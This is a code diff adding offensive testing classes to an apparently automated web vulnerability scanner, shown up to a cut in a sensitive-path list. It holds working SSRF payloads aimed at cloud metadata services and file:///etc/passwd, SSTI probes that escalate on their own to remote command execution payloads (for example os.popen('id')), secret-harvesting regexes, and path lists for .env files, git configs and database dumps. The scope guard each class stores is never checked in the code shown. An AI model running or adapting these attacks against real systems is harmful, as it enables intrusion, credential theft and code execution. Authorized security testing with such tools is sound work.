@@ -1025,3 +1025,1046 @@ class SystematicFuzzer:
             "errors": errors,
             "elapsed_seconds": round(time.monotonic() - start_time, 1),
         }
+
+
+# ── JS Bundle Secret Scanner ─────────────────────────────────────────
+
+class SecretScanner:
+    """Scan JS bundles and text for secrets, API keys, internal URLs.
+
+    Zero LLM cost — pure regex matching against 20+ secret patterns.
+    """
+
+    _PATTERNS: list[tuple[str, re.Pattern]] = [
+        ("aws_access_key", re.compile(r'AKIA[0-9A-Z]{16}')),
+        ("aws_secret_key", re.compile(r'(?:aws_secret|secret_access)[_\s]*(?:key)?["\s:=]+([0-9a-zA-Z/+=]{40})', re.I)),
+        ("github_token", re.compile(r'gh[ps]_[A-Za-z0-9_]{36,}')),
+        ("stripe_secret", re.compile(r'sk_live_[0-9a-zA-Z]{24,}')),
+        ("stripe_publishable", re.compile(r'pk_live_[0-9a-zA-Z]{24,}')),
+        ("google_api_key", re.compile(r'AIzaSy[0-9A-Za-z\-_]{33}')),
+        ("firebase_key", re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}')),
+        ("jwt_token", re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')),
+        ("private_key", re.compile(r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----')),
+        ("slack_token", re.compile(r'xox[bpors]-[0-9a-zA-Z-]{10,}')),
+        ("slack_webhook", re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+')),
+        ("twilio_key", re.compile(r'SK[0-9a-fA-F]{32}')),
+        ("sendgrid_key", re.compile(r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}')),
+        ("heroku_api", re.compile(r'[hH]eroku.*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}')),
+        ("mailgun_key", re.compile(r'key-[0-9a-zA-Z]{32}')),
+        ("square_token", re.compile(r'sq0[a-z]{3}-[0-9A-Za-z\-_]{22,}')),
+        ("internal_url", re.compile(r'https?://(?:internal|staging|dev|admin|api-internal|localhost|127\.0\.0\.1)[.\-:][^\s"\'<>]{3,80}', re.I)),
+        ("source_map", re.compile(r'//[#@]\s*sourceMappingURL=\S+')),
+        ("graphql_op", re.compile(r'(?:query|mutation|subscription)\s+([A-Z]\w{2,})\s*[\({]', re.I)),
+        ("debug_route", re.compile(r'["\'](/(?:debug|_internal|actuator|__debug__|phpinfo|elmah|trace|server-status)[/"\'])', re.I)),
+        ("hardcoded_password", re.compile(r'(?:password|passwd|pwd|secret)\s*[:=]\s*["\']([^"\']{4,50})["\']', re.I)),
+        ("api_endpoint", re.compile(r'["\']((?:/api/|/v[0-9]+/|/graphql|/rest/)[^\s"\'<>]{2,80})["\']')),
+        ("admin_path", re.compile(r'["\'](/(?:admin|manage|dashboard|panel|backoffice|cms)[^\s"\'<>]{0,60})["\']', re.I)),
+    ]
+
+    def scan(self, text: str) -> dict[str, list[dict[str, Any]]]:
+        """Scan text for secrets and interesting patterns.
+
+        Returns dict with keys: secrets, api_endpoints, internal_urls,
+        graphql_ops, source_maps, debug_routes, admin_paths.
+        """
+        results: dict[str, list[dict[str, Any]]] = {
+            "secrets": [],
+            "api_endpoints": [],
+            "internal_urls": [],
+            "graphql_ops": [],
+            "source_maps": [],
+            "debug_routes": [],
+            "admin_paths": [],
+        }
+        seen: set[str] = set()
+
+        for pattern_name, pattern in self._PATTERNS:
+            for match in pattern.finditer(text):
+                value = match.group(1) if match.lastindex else match.group(0)
+                # Dedup
+                dedup_key = f"{pattern_name}:{value[:50]}"
+                if dedup_key in seen:
+                    continue
+                seen.add(dedup_key)
+
+                entry = {
+                    "type": pattern_name,
+                    "value": value[:200],
+                    "position": match.start(),
+                    "context": text[max(0, match.start() - 30):match.end() + 30][:120],
+                }
+
+                # Route to correct category
+                if pattern_name in ("api_endpoint",):
+                    results["api_endpoints"].append(entry)
+                elif pattern_name in ("internal_url",):
+                    results["internal_urls"].append(entry)
+                elif pattern_name in ("graphql_op",):
+                    results["graphql_ops"].append(entry)
+                elif pattern_name in ("source_map",):
+                    results["source_maps"].append(entry)
+                elif pattern_name in ("debug_route",):
+                    results["debug_routes"].append(entry)
+                elif pattern_name in ("admin_path",):
+                    results["admin_paths"].append(entry)
+                else:
+                    results["secrets"].append(entry)
+
+        return results
+
+
+# ── SSRF Tester ──────────────────────────────────────────────────────
+
+class SSRFTester:
+    """Test URL-accepting parameters for SSRF — zero LLM cost.
+
+    Tests IP bypass techniques, cloud metadata, protocol schemes,
+    and response analysis.
+    """
+
+    _PAYLOADS = [
+        # Localhost variants
+        ("localhost", "http://127.0.0.1"),
+        ("localhost_hex", "http://0x7f000001"),
+        ("localhost_decimal", "http://2130706433"),
+        ("localhost_ipv6", "http://[::1]"),
+        ("localhost_ipv6_short", "http://[0:0:0:0:0:0:0:1]"),
+        ("localhost_octal", "http://0177.0.0.1"),
+        ("localhost_zero", "http://0.0.0.0"),
+        # Cloud metadata
+        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
+        ("aws_metadata_dns", "http://instance-data.ec2.internal/latest/meta-data/"),
+        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
+        ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+        # Protocol schemes
+        ("file_etc_passwd", "file:///etc/passwd"),
+        ("file_etc_hosts", "file:///etc/hosts"),
+        # Internal services on common ports
+        ("internal_3000", "http://127.0.0.1:3000"),
+        ("internal_5000", "http://127.0.0.1:5000"),
+        ("internal_8080", "http://127.0.0.1:8080"),
+        ("internal_6379", "http://127.0.0.1:6379"),  # Redis
+        ("internal_9200", "http://127.0.0.1:9200"),  # Elasticsearch
+    ]
+
+    _METADATA_INDICATORS = [
+        "ami-id", "instance-id", "instance-type", "local-hostname",
+        "public-hostname", "public-ipv4", "security-credentials",
+        "iam/info", "computeMetadata", "azureprofile",
+    ]
+
+    _INTERNAL_INDICATORS = [
+        "root:x:0:0:", "/etc/passwd", "localhost", "127.0.0.1",
+        "<html", "<!DOCTYPE", "Welcome", "Dashboard",
+    ]
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            verify=False, timeout=timeout, follow_redirects=True,
+            **proxy_kwargs,
+        )
+
+    async def test(
+        self,
+        url: str,
+        param: str,
+        method: str = "GET",
+        cookies: dict[str, str] | None = None,
+        headers: dict[str, str] | None = None,
+        body: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """Test a parameter for SSRF with multiple payload techniques."""
+        results = []
+        successful = []
+
+        # First, get a baseline response for comparison
+        baseline_resp = None
+        try:
+            if method.upper() == "GET":
+                baseline_resp = await self._client.get(
+                    url, params={param: "https://example.com"},
+                    cookies=cookies, headers=headers,
+                )
+            else:
+                send_body = dict(body) if body else {}
+                send_body[param] = "https://example.com"
+                baseline_resp = await self._client.post(
+                    url, data=send_body, cookies=cookies, headers=headers,
+                )
+        except Exception:
+            pass
+
+        baseline_len = len(baseline_resp.text) if baseline_resp else 0
+
+        for label, payload in self._PAYLOADS:
+            try:
+                if method.upper() == "GET":
+                    resp = await self._client.get(
+                        url, params={param: payload},
+                        cookies=cookies, headers=headers,
+                    )
+                else:
+                    send_body = dict(body) if body else {}
+                    send_body[param] = payload
+                    resp = await self._client.post(
+                        url, data=send_body, cookies=cookies, headers=headers,
+                    )
+
+                body_text = resp.text[:5000]
+                is_interesting = False
+                evidence_details = []
+
+                # Check for metadata indicators
+                for indicator in self._METADATA_INDICATORS:
+                    if indicator in body_text:
+                        is_interesting = True
+                        evidence_details.append(f"metadata indicator: {indicator}")
+
+                # Check for internal content indicators
+                for indicator in self._INTERNAL_INDICATORS:
+                    if indicator in body_text:
+                        is_interesting = True
+                        evidence_details.append(f"internal content: {indicator}")
+
+                # Check for significant response length difference
+                if baseline_len > 0 and abs(len(resp.text) - baseline_len) > 200:
+                    is_interesting = True
+                    evidence_details.append(
+                        f"response length diff: {len(resp.text)} vs baseline {baseline_len}"
+                    )
+
+                result_entry = {
+                    "payload": label,
+                    "url_sent": payload,
+                    "status_code": resp.status_code,
+                    "response_length": len(resp.text),
+                    "interesting": is_interesting,
+                }
+                if evidence_details:
+                    result_entry["evidence"] = evidence_details
+                if is_interesting:
+                    result_entry["response_preview"] = body_text[:500]
+                    successful.append(result_entry)
+
+                results.append(result_entry)
+
+            except Exception as e:
+                results.append({
+                    "payload": label,
+                    "url_sent": payload,
+                    "error": str(e)[:100],
+                })
+
+        return {
+            "vulnerable": len(successful) > 0,
+            "payloads_tested": len(results),
+            "successful_payloads": successful,
+            "evidence": "; ".join(
+                f"{s['payload']}: {', '.join(s.get('evidence', []))}"
+                for s in successful
+            ) if successful else "No SSRF indicators detected",
+            "all_results": results[:10],  # Cap for token savings
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── SSTI Tester ──────────────────────────────────────────────────────
+
+class SSTITester:
+    """Test parameters for Server-Side Template Injection — zero LLM cost.
+
+    Tests polyglot probes, fingerprints template engine, and escalates
+    to RCE payloads when confirmed.
+    """
+
+    _PROBES = [
+        ("jinja2_math", "{{7*7}}", "49"),
+        ("jinja2_string", "{{7*'7'}}", "7777777"),
+        ("twig_math", "{{7*7}}", "49"),
+        ("freemarker_math", "${7*7}", "49"),
+        ("mako_math", "${7*7}", "49"),
+        ("erb_math", "<%= 7*7 %>", "49"),
+        ("pebble_math", "{{7*7}}", "49"),
+        ("velocity_math", "#set($x=7*7)${x}", "49"),
+        ("smarty_math", "{7*7}", "49"),
+        ("nunjucks_math", "{{7*7}}", "49"),
+        ("polyglot_1", "${{<%[%'\"}}%\\.", None),  # Detect via error
+    ]
+
+    _ENGINE_FINGERPRINTS = {
+        "7777777": "Jinja2",
+        "49_from_dollar": "Freemarker/Mako",
+        "49_from_erb": "ERB (Ruby)",
+        "49_from_curly": "Twig/Jinja2/Nunjucks/Pebble",
+    }
+
+    _RCE_PAYLOADS: dict[str, list[tuple[str, str]]] = {
+        "Jinja2": [
+            ("rce_config", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
+            ("rce_mro", "{{''.__class__.__mro__[1].__subclasses__()}}"),
+        ],
+        "Twig": [
+            ("rce_filter", "{{['id']|filter('system')}}"),
+        ],
+        "Freemarker": [
+            ("rce_exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
+        ],
+        "ERB (Ruby)": [
+            ("rce_system", "<%= system('id') %>"),
+        ],
+    }
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            verify=False, timeout=timeout, follow_redirects=True,
+            **proxy_kwargs,
+        )
+
+    async def test(
+        self,
+        url: str,
+        param: str,
+        method: str = "GET",
+        cookies: dict[str, str] | None = None,
+        headers: dict[str, str] | None = None,
+        body: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """Test a parameter for SSTI with multiple template engine probes."""
+        confirmed = False
+        engine = "unknown"
+        confirmed_payload = ""
+        evidence_text = ""
+        probes_tested = 0
+        rce_results = []
+
+        for label, probe, expected in self._PROBES:
+            probes_tested += 1
+            try:
+                if method.upper() == "GET":
+                    resp = await self._client.get(
+                        url, params={param: probe},
+                        cookies=cookies, headers=headers,
+                    )
+                else:
+                    send_body = dict(body) if body else {}
+                    send_body[param] = probe
+                    resp = await self._client.post(
+                        url, data=send_body, cookies=cookies, headers=headers,
+                    )
+
+                body_text = resp.text
+
+                if expected and expected in body_text:
+                    confirmed = True
+                    confirmed_payload = probe
+
+                    # Fingerprint the engine
+                    if expected == "7777777":
+                        engine = "Jinja2"
+                    elif expected == "49":
+                        if "${" in probe:
+                            engine = "Freemarker/Mako"
+                        elif "<%=" in probe:
+                            engine = "ERB (Ruby)"
+                        elif "{{" in probe:
+                            engine = "Jinja2/Twig/Nunjucks"
+
+                    evidence_text = (
+                        f"SSTI confirmed: probe '{probe}' returned '{expected}' "
+                        f"in response. Engine: {engine}. "
+                        f"HTTP {resp.status_code}, response snippet: {body_text[:300]}"
+                    )
+                    break
+
+                # Check for template error (polyglot probe)
+                if expected is None:
+                    error_indicators = [
+                        "TemplateSyntaxError", "Template error", "UndefinedError",
+                        "ParseException", "freemarker", "twig", "jinja2",
+                        "ERB", "SyntaxError", "template",
+                    ]
+                    if any(ind.lower() in body_text.lower() for ind in error_indicators):
+                        evidence_text = (
+                            f"Template error triggered by polyglot probe. "
+                            f"HTTP {resp.status_code}, error snippet: {body_text[:500]}"
+                        )
+
+            except Exception:
+                continue
+
+        # If confirmed, try RCE escalation
+        if confirmed and engine != "unknown":
+            rce_payloads = self._RCE_PAYLOADS.get(engine, [])
+            for rce_label, rce_payload in rce_payloads:
+                try:
+                    if method.upper() == "GET":
+                        resp = await self._client.get(
+                            url, params={param: rce_payload},
+                            cookies=cookies, headers=headers,
+                        )
+                    else:
+                        send_body = dict(body) if body else {}
+                        send_body[param] = rce_payload
+                        resp = await self._client.post(
+                            url, data=send_body, cookies=cookies, headers=headers,
+                        )
+
+                    if "uid=" in resp.text or "root:" in resp.text:
+                        rce_results.append({
+                            "label": rce_label,
+                            "payload": rce_payload,
+                            "output": resp.text[:500],
+                            "rce_confirmed": True,
+                        })
+                    else:
+                        rce_results.append({
+                            "label": rce_label,
+                            "payload": rce_payload,
+                            "output": resp.text[:200],
+                            "rce_confirmed": False,
+                        })
+                except Exception as e:
+                    rce_results.append({"label": rce_label, "error": str(e)[:100]})
+
+        return {
+            "vulnerable": confirmed,
+            "engine": engine,
+            "probes_tested": probes_tested,
+            "confirmed_payload": confirmed_payload,
+            "evidence": evidence_text or "No SSTI indicators detected",
+            "rce_escalation": rce_results if rce_results else None,
+            "template_error_detected": bool(evidence_text and not confirmed),
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Race Condition Tester ────────────────────────────────────────────
+
+class RaceConditionTester:
+    """Fire concurrent identical requests to detect race conditions.
+
+    Zero LLM cost — pure async HTTP.
+    """
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 15,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        self._socks_proxy = socks_proxy
+
+    async def test(
+        self,
+        url: str,
+        method: str = "POST",
+        body: dict[str, Any] | str | None = None,
+        headers: dict[str, str] | None = None,
+        cookies: dict[str, str] | None = None,
+        concurrent_requests: int = 20,
+    ) -> dict[str, Any]:
+        """Fire N identical requests simultaneously and analyze results."""
+        proxy_kwargs: dict[str, Any] = {}
+        if self._socks_proxy:
+            proxy_kwargs["proxy"] = self._socks_proxy
+
+        async def _send_one(idx: int) -> dict[str, Any]:
+            async with httpx.AsyncClient(
+                verify=False, timeout=self._timeout, **proxy_kwargs
+            ) as client:
+                start = time.time()
+                try:
+                    kwargs: dict[str, Any] = {"headers": headers, "cookies": cookies}
+                    if isinstance(body, dict):
+                        kwargs["data"] = body
+                    elif isinstance(body, str):
+                        kwargs["content"] = body
+
+                    resp = await getattr(client, method.lower())(url, **kwargs)
+                    elapsed = time.time() - start
+                    return {
+                        "index": idx,
+                        "status_code": resp.status_code,
+                        "response_length": len(resp.text),
+                        "elapsed_ms": int(elapsed * 1000),
+                        "preview": resp.text[:200],
+                    }
+                except Exception as e:
+                    elapsed = time.time() - start
+                    return {
+                        "index": idx,
+                        "error": str(e)[:100],
+                        "elapsed_ms": int(elapsed * 1000),
+                    }
+
+        # Fire all requests simultaneously
+        tasks = [_send_one(i) for i in range(concurrent_requests)]
+        results = await asyncio.gather(*tasks)
+
+        # Analyze results
+        success_results = [r for r in results if "status_code" in r]
+        status_codes = [r["status_code"] for r in success_results]
+        unique_statuses = set(status_codes)
+        response_lengths = [r["response_length"] for r in success_results]
+        unique_lengths = set(response_lengths)
+        successes_2xx = [r for r in success_results if 200 <= r["status_code"] < 300]
+        response_times = [r["elapsed_ms"] for r in results if "elapsed_ms" in r]
+
+        # Detect race condition indicators
+        race_detected = False
+        indicators = []
+
+        # Multiple 2xx responses for a single-use operation
+        if len(successes_2xx) > 1:
+            indicators.append(f"{len(successes_2xx)} successful (2xx) responses out of {concurrent_requests}")
+
+        # Highly varied response bodies suggest non-atomic processing
+        if len(unique_lengths) > 3 and len(success_results) > 5:
+            indicators.append(f"{len(unique_lengths)} different response lengths detected")
+
+        # All succeeded with same status — suspicious for limited-use operations
+        if len(unique_statuses) == 1 and len(successes_2xx) == concurrent_requests:
+            indicators.append(f"All {concurrent_requests} requests returned same 2xx status")
+            race_detected = True
+
+        return {
+            "total_sent": concurrent_requests,
+            "total_succeeded": len(successes_2xx),
+            "unique_status_codes": sorted(unique_statuses),
+            "unique_response_lengths": len(unique_lengths),
+            "response_times_ms": {
+                "min": min(response_times) if response_times else 0,
+                "max": max(response_times) if response_times else 0,
+                "avg": int(sum(response_times) / len(response_times)) if response_times else 0,
+            },
+            "race_detected": race_detected,
+            "indicators": indicators,
+            "sample_responses": results[:5],
+        }
+
+
+# ── GraphQL Analyzer ─────────────────────────────────────────────────
+
+class GraphQLAnalyzer:
+    """Analyze GraphQL endpoints for misconfigurations — zero LLM cost.
+
+    Tests introspection, enumerates mutations/queries, checks auth.
+    """
+
+    _INTROSPECTION_QUERY = """
+    query IntrospectionQuery {
+      __schema {
+        queryType { name }
+        mutationType { name }
+        types {
+          name
+          kind
+          fields {
+            name
+            args { name type { name kind } }
+            type { name kind ofType { name kind } }
+          }
+        }
+      }
+    }
+    """
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 15,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            verify=False, timeout=timeout, **proxy_kwargs,
+        )
+
+    async def analyze(
+        self,
+        url: str,
+        cookies: dict[str, str] | None = None,
+        headers: dict[str, str] | None = None,
+    ) -> dict[str, Any]:
+        """Analyze a GraphQL endpoint."""
+        gql_headers = {"Content-Type": "application/json"}
+        if headers:
+            gql_headers.update(headers)
+
+        # Step 1: Test introspection
+        schema_available = False
+        mutations = []
+        queries = []
+        all_types = []
+
+        try:
+            resp = await self._client.post(
+                url,
+                json={"query": self._INTROSPECTION_QUERY},
+                headers=gql_headers,
+                cookies=cookies,
+            )
+            data = resp.json()
+            if "data" in data and data["data"].get("__schema"):
+                schema_available = True
+                schema = data["data"]["__schema"]
+
+                # Extract types
+                for t in schema.get("types", []):
+                    name = t.get("name", "")
+                    if name.startswith("__"):
+                        continue  # Skip introspection types
+                    kind = t.get("kind", "")
+                    fields = t.get("fields") or []
+
+                    type_info = {
+                        "name": name,
+                        "kind": kind,
+                        "fields": [
+                            {
+                                "name": f["name"],
+                                "args": [a["name"] for a in (f.get("args") or [])],
+                            }
+                            for f in fields[:20]
+                        ],
+                    }
+                    all_types.append(type_info)
+
+                    # Categorize as query or mutation
+                    query_type_name = (schema.get("queryType") or {}).get("name", "Query")
+                    mutation_type_name = (schema.get("mutationType") or {}).get("name", "Mutation")
+
+                    if name == query_type_name:
+                        for f in fields:
+                            queries.append({
+                                "name": f["name"],
+                                "args": [a["name"] for a in (f.get("args") or [])],
+                            })
+                    elif name == mutation_type_name:
+                        for f in fields:
+                            mutations.append({
+                                "name": f["name"],
+                                "args": [a["name"] for a in (f.get("args") or [])],
+                            })
+        except Exception as e:
+            pass
+
+        # Step 2: Test mutations as anonymous (no auth cookies)
+        unprotected_mutations = []
+        if mutations:
+            for mut in mutations[:10]:  # Test up to 10
+                try:
+                    # Send a minimal mutation without auth
+                    test_query = f"mutation {{ {mut['name']} }}"
+                    resp = await self._client.post(
+                        url,
+                        json={"query": test_query},
+                        headers={"Content-Type": "application/json"},
+                        # No cookies — anonymous
+                    )
+                    resp_data = resp.json()
+                    errors = resp_data.get("errors", [])
+
+                    # Check if auth error occurred
+                    auth_error = any(
+                        any(kw in str(e).lower() for kw in ("unauthorized", "forbidden", "authentication", "not authenticated", "login required", "access denied"))
+                        for e in errors
+                    )
+
+                    if not auth_error and not errors:
+                        unprotected_mutations.append({
+                            "name": mut["name"],
+                            "status": "no_auth_required",
+                            "response": str(resp_data)[:200],
+                        })
+                    elif not auth_error and errors:
+                        # Errors but not auth-related — might be arg validation
+                        error_msgs = [str(e.get("message", ""))[:100] for e in errors[:2]]
+                        if not any("auth" in m.lower() or "permission" in m.lower() for m in error_msgs):
+                            unprotected_mutations.append({
+                                "name": mut["name"],
+                                "status": "possibly_unprotected",
+                                "errors": error_msgs,
+                            })
+                except Exception:
+                    continue
+
+        # Step 3: Test depth limit
+        depth_limit = None
+        try:
+            # Build a deeply nested query
+            nested = "{ __typename " * 20 + "}" * 20
+            resp = await self._client.post(
+                url,
+                json={"query": "query " + nested},
+                headers=gql_headers,
+                cookies=cookies,
+            )
+            resp_data = resp.json()
+            if resp_data.get("errors"):
+                error_msg = str(resp_data["errors"][0].get("message", ""))
+                if "depth" in error_msg.lower() or "complex" in error_msg.lower():
+                    depth_limit = "enforced"
+                else:
+                    depth_limit = "possibly_enforced"
+            else:
+                depth_limit = "not_enforced"
+        except Exception:
+            pass
+
+        return {
+            "schema_available": schema_available,
+            "mutations": mutations[:30],
+            "queries": queries[:30],
+            "types_count": len(all_types),
+            "unprotected_mutations": unprotected_mutations,
+            "depth_limit": depth_limit,
+            "introspection_enabled": schema_available,
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Authorization Matrix Tester ──────────────────────────────────────
+
+class AuthorizationMatrixTester:
+    """Test authorization across roles for every endpoint.
+
+    Zero LLM cost — pure HTTP requests with different auth contexts.
+    """
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            verify=False, timeout=timeout, follow_redirects=False,
+            **proxy_kwargs,
+        )
+
+    async def test(
+        self,
+        endpoints: list[dict[str, Any]],
+        auth_contexts: dict[str, dict[str, Any]],
+    ) -> dict[str, Any]:
+        """Test every endpoint as every role.
+
+        Args:
+            endpoints: List of {"url": str, "method": str}
+            auth_contexts: Dict of role_name -> {"cookies": {...}, "headers": {...}}
+                          Always includes "anonymous" with no auth.
+        """
+        # Ensure anonymous context exists
+        if "anonymous" not in auth_contexts:
+            auth_contexts["anonymous"] = {}
+
+        matrix: dict[str, dict[str, dict[str, Any]]] = {}
+        access_gaps = []
+
+        for ep in endpoints[:30]:  # Cap at 30 endpoints
+            url = ep.get("url", "")
+            method = ep.get("method", "GET").upper()
+            ep_key = f"{method} {url}"
+            matrix[ep_key] = {}
+
+            for role, ctx in auth_contexts.items():
+                try:
+                    kwargs: dict[str, Any] = {
+                        "cookies": ctx.get("cookies"),
+                        "headers": ctx.get("headers"),
+                    }
+                    resp = await getattr(self._client, method.lower())(url, **kwargs)
+                    matrix[ep_key][role] = {
+                        "status": resp.status_code,
+                        "length": len(resp.text),
+                    }
+                except Exception as e:
+                    matrix[ep_key][role] = {"error": str(e)[:80]}
+
+            # Detect access gaps
+            role_statuses = {
+                role: info.get("status", 0)
+                for role, info in matrix[ep_key].items()
+                if isinstance(info, dict) and "status" in info
+            }
+
+            # If ALL roles get same status, it's public — skip
+            if len(set(role_statuses.values())) <= 1:
+                continue
+
+            # Check if anonymous can access something that should be protected
+            anon_status = role_statuses.get("anonymous", 0)
+            if 200 <= anon_status < 400:
+                # Anonymous can access — is this expected?
+                for role, status in role_statuses.items():
+                    if role != "anonymous" and 200 <= status < 400:
+                        continue  # Both can access — might be public
+                # If higher-privilege roles get same access, flag it
+                auth_roles = [r for r in role_statuses if r != "anonymous"]
+                if auth_roles:
+                    access_gaps.append({
+                        "endpoint": ep_key,
+                        "issue": "anonymous_access",
+                        "anonymous_status": anon_status,
+                        "details": role_statuses,
+                    })
+
+            # Check for horizontal/vertical escalation
+            role_list = list(role_statuses.keys())
+            for i, role_a in enumerate(role_list):
+                for role_b in role_list[i+1:]:
+                    status_a = role_statuses[role_a]
+                    status_b = role_statuses[role_b]
+                    # If a lower-privilege role can access what higher can
+                    if (status_a >= 400 and 200 <= status_b < 400) or \
+                       (status_b >= 400 and 200 <= status_a < 400):
+                        access_gaps.append({
+                            "endpoint": ep_key,
+                            "issue": "access_control_gap",
+                            "roles": {role_a: status_a, role_b: status_b},
+                        })
+
+        return {
+            "endpoints_tested": len(matrix),
+            "roles_tested": list(auth_contexts.keys()),
+            "matrix": matrix,
+            "access_gaps": access_gaps,
+            "gaps_found": len(access_gaps),
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Info Disclosure Scanner ──────────────────────────────────────────
+
+
+class InfoDisclosureScanner:
+    """Content-verified sensitive path scanner — zero LLM cost.
+
+    Checks 200+ known sensitive paths, but ONLY reports findings where
+    the response content matches expected patterns (not just HTTP 200).
+    """
+
+    # (path, category, content_verification_regex)
+    _PATHS: list[tuple[str, str, str]] = [
+        # Git
+        ("/.git/HEAD", "git", r"ref:\s*refs/heads/"),
+        ("/.git/config", "git", r"\[core\]|\[remote"),
+        # Environment files
+        ("/.env", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
+        ("/.env.local", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
+        ("/.env.production", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
+        ("/.env.backup", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
+        # Config files
+        ("/config.php.bak", "config", r"<\?php|\$[a-zA-Z_]+\s*="),
+        ("/config.php~", "config", r"<\?php|\$[a-zA-Z_]+\s*="),
+        ("/wp-config.php.bak", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
+        ("/wp-config.php~", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
+        ("/wp-config.php.old", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
+        # Docker / CI
+        ("/Dockerfile", "docker", r"FROM\s+\w|RUN\s+|COPY\s+|ENV\s+"),
+        ("/docker-compose.yml", "docker", r"services:|version:|volumes:"),
+        ("/docker-compose.yaml", "docker", r"services:|version:|volumes:"),
+        ("/.dockerenv", "docker", r".*"),  # Mere existence is a signal
+        # Swagger / API docs
+        ("/swagger.json", "api_docs", r'"swagger"|"openapi"|"paths"'),
+        ("/openapi.json", "api_docs", r'"openapi"|"paths"'),
+        ("/api-docs", "api_docs", r"swagger|openapi|paths"),
+        ("/v1/swagger.json", "api_docs", r'"swagger"|"openapi"'),
+        ("/v2/swagger.json", "api_docs", r'"swagger"|"openapi"'),
+        # Debug / admin
+        ("/phpinfo.php", "php", r"phpinfo\(\)|PHP Version|Configuration"),
+        ("/info.php", "php", r"phpinfo\(\)|PHP Version"),
+        ("/server-status", "apache", r"Apache Server Status|Scoreboard"),
+        ("/server-info", "apache", r"Apache Server Information"),
+        ("/.htpasswd", "apache", r"^\w+:\$|^\w+:\{"),
+        ("/.htaccess", "apache", r"RewriteRule|Deny|Allow|AuthType"),
+        # Spring Boot Actuator
+        ("/actuator", "spring", r'"_links"|"self"'),
+        ("/actuator/env", "spring", r'"propertySources"|"activeProfiles"'),
+        ("/actuator/health", "spring", r'"status"\s*:\s*"UP"'),
+        ("/actuator/configprops", "spring", r'"contexts"|"beans"'),
+        ("/actuator/mappings", "spring", r'"dispatcherServlets"|"contexts"'),
+        ("/actuator/heapdump", "spring", r".*"),  # Binary — existence check
+        # Laravel
+        ("/telescope", "laravel", r"Laravel Telescope|telescope"),
+        ("/storage/logs/laravel.log", "laravel", r"\[\d{4}-\d{2}-\d{2}|Stack trace|Exception"),
+        ("/_debugbar/open", "laravel", r"debugbar|phpdebugbar"),
+        # Django
+        ("/__debug__/", "django", r"djdt|Django Debug Toolbar"),
+        # Node.js
+        ("/package.json", "nodejs", r'"name"\s*:|"version"\s*:|"dependencies"'),
+        ("/package-lock.json", "nodejs", r'"lockfileVersion"|"dependencies"'),
+        # Source maps
+        ("/main.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"|"mappings"'),
+        ("/app.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"|"mappings"'),
+        ("/bundle.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"'),
+        # Backup files
+        ("/backup.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
+        ("/dump.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
+        ("/db.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
+        ("/database.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
+        ("/backup.zip", "backup", r"PK"),  # ZIP magic bytes
+        ("/backup.tar.gz", "backup", r".*"),  # Binary check
+        ("/site.sql", "backup", r"CREATE TABLE|INSERT INTO"),
+        # GraphQL
+        ("/graphql", "graphql", r'"data"|"errors"|__schema'),
